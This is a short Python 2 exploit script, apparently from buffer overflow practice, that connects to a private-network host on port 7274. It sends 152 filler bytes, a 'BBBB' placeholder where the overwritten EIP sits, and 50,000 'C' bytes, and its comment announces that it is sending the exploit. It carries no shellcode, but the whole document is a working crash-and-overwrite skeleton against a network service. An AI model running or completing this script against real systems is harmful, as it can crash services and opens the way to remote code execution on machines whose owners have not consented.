#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
import socket
from struct import *

host="192.168.15.19"
port = 7274

offset = "A" * 152
eip = "BBBB"
esp = "C" * 50000

payload = offset + eip + esp

exp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

exp.connect((host,port))

print "[*] Enviando exploit..."
exp.recv(4096)
exp.send(payload)
exp.close()